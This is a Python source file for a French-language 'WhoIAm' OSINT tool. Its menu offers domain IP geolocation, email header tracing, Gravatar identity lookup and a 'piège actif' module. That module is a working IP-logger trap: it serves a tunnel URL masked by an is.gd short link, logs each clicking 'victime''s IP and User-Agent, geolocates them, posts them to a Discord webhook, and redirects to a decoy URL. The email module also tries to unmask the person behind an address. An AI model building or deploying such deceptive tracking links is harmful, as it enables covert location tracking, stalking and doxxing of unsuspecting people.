import time
import sys
import socket
import os
import urllib.request
import urllib.error
import urllib.parse
import json
import re
import hashlib
from http.server import BaseHTTPRequestHandler, HTTPServer

# Activation des couleurs sous Windows PowerShell
if os.name == 'nt':
    os.system('color')

VERT = '\033[92m'
ROUGE = '\033[91m'
BLEU = '\033[94m'
JAUNE = '\033[93m'
RESET = '\033[0m'

def affiche_banniere():
    banniere = f"""{VERT}
    __          ___             _____         _               
 \ \        / / |           |_   _|       / \              
  \ \  /\  / /| |__   ___     | |        / _ \   _ __ ___  
   \ \/  \/ / | '_ \ / _ \    | |       / ___ \ | '_ ` _ \ 
    \  /\  /  | | | | (_) |  _| |_     / /   \ \| | | | | |
     \/  \/   |_| |_|\___/  |_____|   /_/     \_\_| |_| |_|

     [+] Who I'am - Projet de shark OSINT & Framework
     [+] Version : 3.1 - Forensics Pro & Dynamic Pass Edition
    {RESET}"""
    print(banniere)


def geo_localiser_ip(ip_adresse):
    """Fonction utilitaire pour géolocaliser une IPv4 ou une IPv6"""
    try:
        # ip-api prend en charge l'IPv4 et l'IPv6 nativement
        response = urllib.request.urlopen(f"http://ip-api.com/json/{ip_adresse}", timeout=3)
        donnees = json.loads(response.read()) 

        if donnees['status'] == 'success':
            print(f"{VERT}    [>] Pays : {donnees['country']}{RESET}")
            print(f"{VERT}    [>] Ville : {donnees['city']}{RESET}")
            print(f"{VERT}    [>] FAI : {donnees['isp']}{RESET}")
            
            lat = donnees.get('lat')
            lon = donnees.get('lon')
            if lat and lon:
                print(f"{VERT}    [>] Coordonnées GPS : {lat}, {lon}{RESET}")
                print(f"{JAUNE}    [🖈] Carte Google Maps : https://www.google.com/maps?q={lat},{lon}{RESET}")
        else:
            print(f"{JAUNE}    [i] Impossible de géolocaliser cette IP spécifique (IP de routage interne ou privée).{RESET}")
    except Exception as e:
        print(f"{ROUGE}    [!] Erreur de géolocalisation pour l'IP {ip_adresse} : {e}{RESET}")


# ==========================================
# MODULE 1 : ANALYSE OSINT (DOMAINE)
# ==========================================
def option_analyse_passive():
    print(f"\n{BLEU}[+] Lancement de l'empreinte web ...{RESET}")
    url = input(f"{JAUNE}[>] Entre l'URL du site web cible : {RESET}")

    try:
        domaine = urllib.parse.urlparse(url).netloc
        if not domaine:
            domaine = url.split('/')[0]

        print(f"\n{VERT}[+] Cible identifiée : {domaine}{RESET}")
        
        ip_serveur = socket.gethostbyname(domaine)
        print(f"{VERT}[+] Adresse IP trouvée : {ip_serveur}{RESET}")

        print(f"{BLEU}[*] Info GeoIP du serveur...{RESET}")
        geo_localiser_ip(ip_serveur)

    except socket.gaierror:
        print(f"{ROUGE}[-] Erreur de résolution DNS pour {domaine}{RESET}")
    except Exception as e:
        print(f"{ROUGE}[-] Erreur lors de l'analyse de {domaine} : {e}{RESET}") 

    time.sleep(2)


# ==========================================
# MODULE 2 : PIÈGE ACTIF DIRECT (IS.GD)
# ==========================================
def option_piege_actif():
    print(f"\n{BLEU}[*] Lancement du piège actif (Discrétion Maximale)...{RESET}")
    url_cible = input(f"{JAUNE}[>] URL de redirection finale (ex: https://youtube.com/...) : {RESET}")
    webhook = input(f"{JAUNE}[>] URL du webhook Discord (ou Entrée pour ignorer) : {RESET}")
    
    print(f"\n{BLEU}[*] Configuration de la façade publique...{RESET}")
    url_publique = input(f"{JAUNE}[>] Entre l'URL de ton tunnel (ex: https://xxxx.serveousercontent.com) : {RESET}")
    
    port = 9000
    url_masquee = "Impossible de générer le lien"
    
    if url_publique:
        print(f"\n{BLEU}[*] Génération du lien HTTPS direct via l'API is.gd...{RESET}")
        try:
            url_encodee = urllib.parse.quote(url_publique)
            api_url = f"https://is.gd/create.php?format=simple&url={url_encodee}"
            req_api = urllib.request.Request(api_url, headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req_api, timeout=5) as reponse:
                url_masquee = reponse.read().decode('utf-8').strip()
        except Exception as e:
            print(f"{ROUGE}[!] Échec du masquage API : {e}{RESET}")

    class ServeurEspion(BaseHTTPRequestHandler):
        def log_message(self, format, *args): pass

        def do_GET(self):
            ip_victime = self.client_address[0]
            navigateur = self.headers.get('User-Agent', 'Inconnu/Masqué')   

            print(f"\n{ROUGE}[!!!] CLIC DÉTECTÉ !!!{RESET}")
            print(f"{VERT}[+] Adresse IP de la victime : {ip_victime}{RESET}")
            print(f"{VERT}[+] User-Agent : {navigateur}{RESET}")

            if ip_victime != "127.0.0.1" and not ip_victime.startswith("192.168.") and not ip_victime.startswith("10."):
                print(f"{BLEU}[*] Localisation de la victime en direct :{RESET}")
                geo_localiser_ip(ip_victime)

            if webhook:
                try:
                    msg = f"**Nouvelle victime détectée !**\n\n**IP :** `{ip_victime}`\n**User-Agent :** `{navigateur}`"
                    payload = {"content": msg}
                    req = urllib.request.Request(webhook, data=json.dumps(payload).encode(), headers={'Content-Type': 'application/json'})
                    urllib.request.urlopen(req)
                except: pass

            self.send_response(302)
            self.send_header('Location', url_cible)
            self.end_headers()

    try:
        serveur = HTTPServer(('0.0.0.0', port), ServeurEspion)
        print(f"\n{VERT}[+] Configuration validée !{RESET}")
        if url_publique and not url_masquee.startswith("Impossible"):
            print(f"{VERT}[+] LIEN HTTPS DIRECT À ENVOYER : {url_masquee}{RESET}")
        else:
            print(f"{JAUNE}[*] Aucun lien généré, utilise ton adresse brute ou ton tunnel.{RESET}")
            
        print(f"{JAUNE}[*] Serveur en écoute sur le port {port}...{RESET}")
        serveur.serve_forever()
    except KeyboardInterrupt:
        print(f"\n{ROUGE}[!] Arrêt du serveur espion.{RESET}")
        serveur.server_close()


# ==========================================
# MODULE 3 : TRAKER L'EXPÉDITEUR & MÉTADONNÉES (EMAIL FORENSICS V4.1)
# ==========================================
def option_analyse_email():
    print(f"\n{BLEU}[*] Lancement du traqueur d'expéditeur d'e-mail avancé...{RESET}")
    print(f"{JAUNE}[i] Colle les en-têtes bruts (Headers) du mail ci-dessous.")
    print(f"[i] Quand tu as fini, tape 'FIN' sur une nouvelle ligne et appuie sur Entrée.{RESET}\n")
    
    lignes = []
    while True:
        ligne = input()
        if ligne.strip() == "FIN":
            break
        lignes.append(ligne)
    
    bloc_headers = "\n".join(lignes)
    headers_lower = bloc_headers.lower()
    
    print(f"\n{BLEU}[*] Extraction des métadonnées forensics en cours...{RESET}")
    print("-" * 50)

    # 1. Extraction du Client de Messagerie (X-Mailer / User-Agent du mail)
    x_mailer = "Non spécifié (Webmail direct ou en-tête masqué)"
    for ligne in lignes:
        if ligne.lower().startswith("x-mailer:") or ligne.lower().startswith("user-agent:"):
            x_mailer = AppSplit = ligne.split(":", 1)[1].strip()
            break
    print(f"{VERT}[+] Logiciel / Client d'envoi (X-Mailer) : {x_mailer}{RESET}")

    # 2. Extraction du Message-ID
    message_id = "Introuvable"
    for ligne in lignes:
        if ligne.lower().startswith("message-id:"):
            message_id = ligne.split(":", 1)[1].strip()
            break
    print(f"{VERT}[+] Identifiant unique (Message-ID) : {message_id}{RESET}")

    # 3. Analyse de la plateforme globale
    if "gmail.com" in headers_lower or "google.com" in headers_lower:
        print(f"{JAUNE}[-] Infrastructure : Écosystème Google (IP client masquée){RESET}")
    elif "outlook.com" in headers_lower or "office365.com" in headers_lower or "hotmail" in headers_lower:
        print(f"{JAUNE}[-] Infrastructure : Écosystème Microsoft (IP potentiellement masquée){RESET}")
    elif "proton.me" in headers_lower or "protonmail" in headers_lower:
        print(f"{JAUNE}[-] Infrastructure : ProtonMail (Anonymisation stricte){RESET}")

    print("-" * 50)

    # 4. Extraction et Chronologie des serveurs de rebond (Received lines)
    print(f"{BLEU}[*] Analyse de la chaîne de transport (Sauts Réseau) :{RESET}")
    
    serveurs_rebond = []
    for ligne in lignes:
        if ligne.lower().startswith("received:"):
            propre = ligne.replace("Received:", "").strip()
            if "by" in propre:
                propre = propre.split(";")[0].strip()
            serveurs_rebond.append(propre)

    if serveurs_rebond:
        serveurs_rebond.reverse()
        for i, serveur in enumerate(serveurs_rebond, 1):
            print(f"  {JAUNE}[Saut #{i}]{RESET} -> {serveur}")
    else:
        print(f"{JAUNE}  [-] Aucune ligne de transport standard détectée.{RESET}")

    print("-" * 50)

    # 5. Extraction stricte des IP (Version Forensics 4.1 - Zéro bug de date)
    headers_sans_dates = "\n".join([l for l in lignes if not any(k in l.lower() for k in ["date:", "mon,", "tue,", "wed,", "thu,", "fri,", "sat,", "sun,"])])

    regex_ipv4 = r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b'
    regex_ipv6 = r'\b(?:[a-fA-F0-9]{1,4}:){3,7}[a-fA-F0-9]{1,4}\b'
    
    ips_v4 = re.findall(regex_ipv4, headers_sans_dates)
    ips_v6 = re.findall(regex_ipv6, headers_sans_dates)
    
    ip_filtre = ["127.", "192.168.", "10.", "172.16.", "0.0.0.0", "fe80:", "::1"]
    ips_publiques = []
    
    for ip in ips_v4:
        if not any(ip.startswith(f) for f in ip_filtre) and ip not in ips_publiques:
            if all(int(octet) < 256 for octet in ip.split('.')):
                ips_publiques.append(ip)

    for ip in ips_v6:
        if not any(ip.startswith(f) for f in ip_filtre) and ip not in ips_publiques:
            ips_publiques.append(ip)
            
    # --- Affichage et Géolocalisation des résultats ---
    if ips_publiques:
        print(f"{VERT}[+] Géolocalisation des IP trouvées dans le Header :{RESET}")
        for index, ip in enumerate(ips_publiques, 1):
            print(f"\n  {BLEU}[IP #{index}] -> {ip}{RESET}")
            geo_localiser_ip(ip)
    else:
        print(f"\n{ROUGE}[!] Aucune adresse IP publique externe à géolocaliser.{RESET}")
        
    time.sleep(3)


# ==========================================
# MODULE 4 : RECONNAISSANCE E-MAIL (OSINT IDENTITÉ)
# ==========================================
def option_reconnaissance_email():
    print(f"\n{BLEU}[*] Lancement du module de reconnaissance d'identité par E-mail...{RESET}")
    email_cible = input(f"{JAUNE}[>] Entre l'adresse e-mail cible : {RESET}").strip()

    if not re.match(r"[^@]+@[^@]+\.[^@]+", email_cible):
        print(f"{ROUGE}[!] Format d'adresse e-mail invalide.{RESET}")
        time.sleep(1.5)
        return

    print(f"\n{BLEU}[*] Analyse de la structure du nom d'utilisateur...{RESET}")
    username = email_cible.split('@')[0]
    domain = email_cible.split('@')[1]
    
    print(f"{VERT}    [>] Pseudo / Username : {username}{RESET}")
    print(f"{VERT}    [>] Domaine d'hébergement : {domain}{RESET}")
    
    print(f"\n{BLEU}[*] Interrogation des bases de données publiques (Gravatar)...{RESET}")
    hash_email = hashlib.md5(email_cible.lower().encode()).hexdigest()
    url_api = f"https://fr.gravatar.com/{hash_email}.json"

    try:
        req = urllib.request.Request(url_api, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=4) as response:
            donnees = json.loads(response.read().decode())
            profil = donnees['entry'][0]
            
            print(f"\n{VERT}[🗲] PROFIL TROUVÉ !{RESET}")
            print(f"{VERT}    [>] Nom d'affichage : {profil.get('displayName', 'Non renseigné')}{RESET}")
            print(f"{VERT}    [>] Vrai Nom Nom complet : {profil.get('name', {}).get('formatted', 'Non renseigné')}{RESET}")
            
            if profil.get('currentLocation'):
                print(f"{VERT}    [>] Localisation déclarée : {profil.get('currentLocation')}{RESET}")
                
            if profil.get('urls'):
                print(f"{VERT}    [>] Liens / Réseaux associés :{RESET}")
                for link in profil.get('urls'):
                    print(f"        - {link.get('title')} : {link.get('value')}")
                    
            print(f"{JAUNE}    [i] Photo de profil disponible sur : {profil.get('thumbnailUrl')}{RESET}")

    except urllib.error.HTTPError as e:
        if e.code == 404:
            print(f"{JAUNE}[i] Aucune correspondance publique directe trouvée dans la base Gravatar pour cet e-mail.{RESET}")
            print(f"{JAUNE}[i] Conseil : Pour pousser l'enquête, utilise SpiderFoot pour vérifier l'existence de comptes sur +200 plateformes (Leaking, Skype, Twitter).{RESET}")
        else:
            print(f"{ROUGE}[!] Erreur de connexion à l'API : {e}{RESET}")
    except Exception as e:
        print(f"{ROUGE}[!] Une erreur est survenue : {e}{RESET}")

    time.sleep(3)


# ==========================================
# MENU PRINCIPAL
# ==========================================
def menu_principal():
    while True:
        affiche_banniere()
        print(f"{JAUNE} Sélectionne un module :{RESET}")
        print("1. [OSINT] Empreinte Serveur (Trouver IP/Geo d'un site web)")
        print("2. [PIEGE] Piège Actif (Créer un lien piégé pour collecter les clics)")
        print("3. [FORENSICS] Traquer l'Expéditeur (Analyser les en-têtes de Multi-Mails)")
        print("4. [OSINT] Reconnaissance E-mail (Trouver l'identité derrière un mail)")
        print("5. Quitter")
        
        choix = input(f"\n{ROUGE}[>] WhoIAm : {RESET}")

        if choix == '1':
            option_analyse_passive()
        elif choix == '2':
            option_piege_actif()
        elif choix == '3':
            option_analyse_email()
        elif choix == '4':
            option_reconnaissance_email()
        elif choix == '5':
            print(f"{ROUGE}[-] Fermeture de WhoIAm...{RESET}")
            sys.exit()
        else:
            print(f"{ROUGE}[-] Choix invalide, réessaye...{RESET}")
            time.sleep(1)

if __name__ == "__main__":
    menu_principal()
